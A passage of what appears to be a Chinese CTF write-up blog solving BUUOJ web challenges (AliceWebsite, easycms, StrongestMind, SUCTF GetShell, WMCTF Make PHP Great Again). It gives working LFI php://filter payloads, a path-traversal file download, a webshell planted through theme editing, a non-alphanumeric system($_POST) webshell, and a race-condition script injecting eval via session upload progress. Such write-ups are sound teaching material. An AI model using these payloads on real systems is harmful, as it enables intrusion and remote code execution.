class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>a&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span>]<span class="hljs-operator">=</span>create_function&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span>]<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure>

<p>最后用base64编码解码获得flag</p>
<h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p>先看看源码，没有给任何提示，dirsearch也扫不出除home和about的其它网址<br>点击About Me发现url变为index.php?action&#x3D;about.php<br>把action后面改为flag.php<br>页面显示file not found<br>再试试其它的<br>用伪协议试试</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?action=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>试试&#x2F;etc&#x2F;passwd<br><img src="/images/9067B70DE08B4b389BD5FBB4272F280B.png" srcset="/img/loading.gif" lazyload><br>可以看到结果<br>传?action&#x3D;&#x2F;flag就完成了<br>看下源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$action</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;home.php&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$action</span>)) &#123;<br>    	<span class="hljs-keyword">include</span> <span class="hljs-variable">$action</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>因为有file_exists，所以不能用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php伪协议</p>
<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>是一个静态网页，点啥都没有用(除了友链)，用dirsearch扫一下</p>
<p>发现有admin.php,成功进入登录页面</p>
<p><img src="/images/99D98BD3027C497cAB8A840DF127FDC1.png" srcset="/img/loading.gif" lazyload><br>题目有提示密码是五位弱口令账号密码为admin&#x2F;12345<br>登录进来发现可以交互的内容有很多<br>直接捡重要的来说</p>
<h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><p>设计-&gt;自定义-&gt;导出主题-&gt;保存</p>
<p><img src="/images/D25A1F6DEE284e369961A29623FE7B9D.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/C9FC6F9337B54307916AF5EF4D9D2A72.png" srcset="/img/loading.gif" lazyload></p>
<p>下载下来的文件右键复制下载链接(谷歌复制不下来，不到在哪，用的是火狐)<br><img src="/images/F94947C1B4D04d86873A3A0FD8238C53.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://7513b6ee-ccd7-4ed5-<span class="hljs-number">94b1</span>-7b5c82cc973b.node5.buuoj.cn:<span class="hljs-number">81</span>/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=<br></code></pre></td></tr></table></figure>

<p><img src="/images/CD760DCECCA480691C7C185CE147638.png" srcset="/img/loading.gif" lazyload><br>base64解码后发现theme后面的为文件的绝对路径<br>我们直接把theme后面替换为&#x2F;flag，并base64加密</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://7513b6ee-ccd7-4ed5-<span class="hljs-number">94b1</span>-7b5c82cc973b.node5.buuoj.cn:<span class="hljs-number">81</span>/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=<br></code></pre></td></tr></table></figure>
<p>下载了一个flag.zip压缩包，不用解压缩也不用打开，直接nodepad++打开或者改.txt后缀<br><img src="/images/FF264A94EC3C47f79000B7972E289283.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>同样的页面，点击编辑,类型为php源代码<br><img src="/images/9AC82E4C2F8E435aA5941A2F3F19F2B8.png" srcset="/img/loading.gif" lazyload><br>保存的时候要我先创建一个zlsj文件<br><img src="/images/6F173702649B4549980C8D150CCEC451.png" srcset="/img/loading.gif" lazyload><br>创建文件位置在设计-&gt;组件-&gt;素材库-&gt;上传素材<br><img src="/images/8EBF9E6A84AA40e3841ADBC68B5E501C.png" srcset="/img/loading.gif" lazyload><br>本地创建一个txt文件，内容随意<br>上传文件后编辑它的名称可导致目录穿越创建文件至system目录<br><img src="/images/D20C62AF621A4f66B4B27EE302E27DC6.png" srcset="/img/loading.gif" lazyload><br><img src="/images/27F9C4A104324dff9D5A44C9B5901830.png" srcset="/img/loading.gif" lazyload><br>保存修改后可以看到文件路径如上，再返回主题处编辑网页头部插入php<br><img src="/images/DD30018E870E4fae85E1572FFFC7BAAB.png" srcset="/img/loading.gif" lazyload><br>这时候就能保存成功了，返回网站主页查看<br><img src="/images/84C51322BFB446e4AB1D58D42C084419.png" srcset="/img/loading.gif" lazyload><br>成功显示flag</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>既然它说了1000次给flag，那就写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://f3f6839b-dc8a-4924-a329-53c9cf8fdd80.node5.buuoj.cn:81/&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;answer&quot;</span>: <span class="hljs-number">1</span>&#125;<br>a = requests.session()<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    b = a.post(url=url, data=data)<br>    b.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    <span class="hljs-comment"># print(b.text)</span><br>    num = re.findall(<span class="hljs-string">r&#x27;(.*?)&lt;br&gt;&#x27;</span>, b.text)[<span class="hljs-number">6</span>]<br>    <span class="hljs-built_in">print</span>(num)<br>    num1 = <span class="hljs-built_in">eval</span>(num)<span class="hljs-comment">#可以将字符串转换为算数式</span><br>    <span class="hljs-keyword">if</span> num1:<br>        data[<span class="hljs-string">&quot;answer&quot;</span>] = num1<br>    <span class="hljs-comment"># print(data)</span><br>    num2 = re.findall(<span class="hljs-string">r&#x27;(.*?)&lt;br&gt;&#x27;</span>, b.text)[<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(num2)<br>    time.sleep(<span class="hljs-number">0.05</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;第 1001 次成功啦&#x27;</span> <span class="hljs-keyword">in</span> b.text:<br>        <span class="hljs-built_in">print</span>(b.text)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>


<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>页面没有什么明显的信息，看看源码<br>源码中有一个超链接?index.php?act&#x3D;upload<br>进入<br>看到是文件上传<br>但是先不急着上传，它旁边给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);<br>        &#125;<br>    &#125;     <br>&#125; <br></code></pre></td></tr></table></figure>
<p>大意是获取文件内容，从第6个字符开始比对黑名单<br>这里要fuzz一下，看看哪些字符可以使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url, alph</span>):<br>    header = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;4ba5c0ca-9a4e-4d1e-9e8e-a5cbdc6fccb9.node5.buuoj.cn:81&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;multipart/form-data; boundary=---------------------------37233154152715907679412218478&#x27;</span><br>    &#125;<br>    data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">-----------------------------37233154152715907679412218478</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-string">Content-Type: text/plain</span><br><span class="hljs-string"></span><br><span class="hljs-string">12345&#123;&#125;</span><br><span class="hljs-string">-----------------------------37233154152715907679412218478</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------37233154152715907679412218478--</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 这里因为上传的内容还有上传按钮的值&quot;提交&quot;,所以采用encode(&#x27;utf-8&#x27;),但实际上可以去掉&quot;提交&quot;上传,这里也就不需要encode(&#x27;utf-8&#x27;)了</span><br>    response = res.post(url, data=data.<span class="hljs-built_in">format</span>(alph).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), headers=header)<br>    <span class="hljs-keyword">while</span> response.status_code != <span class="hljs-number">200</span>:<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        response = res.post(url, data=data.<span class="hljs-built_in">format</span>(alph).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), headers=header)<br>    <span class="hljs-keyword">return</span> response.text<br><br><br>url = <span class="hljs-string">&quot;http://4ba5c0ca-9a4e-4d1e-9e8e-a5cbdc6fccb9.node5.buuoj.cn:81/index.php?act=upload&quot;</span><br>alphs = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>    bak = check(url, <span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">if</span> bak.find(<span class="hljs-string">&quot;illegal&quot;</span>, <span class="hljs-number">0</span>) == -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Can use &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br>        alphs += <span class="hljs-built_in">chr</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Cn&#x27;t use &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*&#x27;</span> + alphs + <span class="hljs-string">&#x27;*]&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>爆出这些字符可以使用</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$().;=[]_~<br></code></pre></td></tr></table></figure>
<p>可以看到数字即英文字母都被过滤了，这里使用特殊的木马构造方式<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br>这里我们采用取反的方法<br><img src="/images/A0673E9D30148b08CF1B9FA38C9B997.png" srcset="/img/loading.gif" lazyload><br>用它的方法构造php一句话木马</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?=<br><span class="hljs-variable">$_</span>=[];<span class="hljs-regexp">//</span>array<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span>arrayarray<br><span class="hljs-variable">$___</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-regexp">//</span>array==arrayarray 错误为false<br><span class="hljs-variable">$____</span> = (<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-regexp">//</span>array==array相同true<br><span class="hljs-variable">$_____</span>=~(区[<span class="hljs-variable">$____</span>]).~(冈[<span class="hljs-variable">$____</span>]).~(区[<span class="hljs-variable">$____</span>]).~(勺[<span class="hljs-variable">$____</span>]).~(皮[<span class="hljs-variable">$____</span>]).~(针[<span class="hljs-variable">$____</span>]);<span class="hljs-regexp">//</span>system<br><span class="hljs-variable">$______</span>=~(码[<span class="hljs-variable">$____</span>]).~(寸[<span class="hljs-variable">$____</span>]).~(小[<span class="hljs-variable">$____</span>]).~(欠[<span class="hljs-variable">$____</span>]).~(立[<span class="hljs-variable">$____</span>]);<span class="hljs-regexp">//</span>_POST<br><span class="hljs-variable">$_____</span>($<span class="hljs-variable">$______</span>[_]);<span class="hljs-regexp">//</span>system(<span class="hljs-variable">$_POST</span>[_])<br></code></pre></td></tr></table></figure>

<p>去掉换行符和空格</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<span class="hljs-variable">$___</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-variable">$____</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-variable">$_____</span>=~(区[<span class="hljs-variable">$____</span>]).~(冈[<span class="hljs-variable">$____</span>]).~(区[<span class="hljs-variable">$____</span>]).~(勺[<span class="hljs-variable">$____</span>]).~(皮[<span class="hljs-variable">$____</span>]).~(针[<span class="hljs-variable">$____</span>]);<span class="hljs-variable">$______</span>=~(码[<span class="hljs-variable">$____</span>]).~(寸[<span class="hljs-variable">$____</span>]).~(小[<span class="hljs-variable">$____</span>]).~(欠[<span class="hljs-variable">$____</span>]).~(立[<span class="hljs-variable">$____</span>]);<span class="hljs-variable">$_____</span>(<span class="hljs-variable">$$</span>______[_]);<br></code></pre></td></tr></table></figure>
<p>上面代码构造的语句是system($<em>POST[</em>])<br>这里不能有空格和换行，空格也是黑名单<br><img src="/images/DE7C1B6F097F489aB811A0A0399DD9C6.png" srcset="/img/loading.gif" lazyload><br>这里给了地址，直接进<br><img src="/images/420215618600528ACB7BA8F63A399C1.png" srcset="/img/loading.gif" lazyload><br>根目录的flag是个假flag<br>这里可以使用env显示系统中的环境变量来查看flag<br><img src="/images/D80FD0676FEA46aaACD213245E7F2226.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>解法一:</strong></p>
<p>这道题没有使用文件包含考点经常出现的include(),而是requir_once(),这个函数的特点是只包含一次，因为刚才是已经require_once ‘flag.php’ 了，不能再次包含，所以需要绕过require_once(),让它检测传入的文件名哈希值既没有重复，又能读到flag.php这个文件</p>
<p>require_once()在对软连接的操作上存在一些缺陷，软连接层数较多会是hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下</p>
<p>&#x2F;proc&#x2F;self&#x2F;是只想当前进程的&#x2F;proc&#x2F;pid&#x2F;，而&#x2F;proc&#x2F;self&#x2F;root是指向&#x2F;(根目录)的软链接，所以让软链接层数变多即可造成重复包含</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure>

<p><strong>解法二:(非预期解)</strong></p>
<p>可以利用PHP_SESSION_UPLOAD_PROGRESS上传文件后进行文件包含：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import io<br>import requests<br>import threading<br>sessid = <span class="hljs-string">&#x27;bbbbbbb&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;<br>def write(session):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post( <span class="hljs-string">&#x27;http://aaf83abf-31f4-4680-b042-6d2a60e9810a.node5.buuoj.cn:81/&#x27;</span>, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )<br>def read(session):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        resp = session.post(<span class="hljs-string">&#x27;http://aaf83abf-31f4-4680-b042-6d2a60e9810a.node5.buuoj.cn:81/?file=/tmp/sess_&#x27;</span>+sessid,<span class="hljs-attribute">data</span>=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+++++++++++++]retry&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&quot;__main__&quot;:<br>    <span class="hljs-attribute">event</span>=threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,30):<br>            threading.Thread(<span class="hljs-attribute">target</span>=write,args=(session,)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,30):<br>            threading.Thread(<span class="hljs-attribute">target</span>=read,args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure>
<p><img src="/images/22AA6D8691E44429ABDBB45C04EAFBCE.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm1&#x27;</span>];<br><span class="hljs-variable">$comm2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm2&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm1</span>))<br>    <span class="hljs-variable">$comm1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span 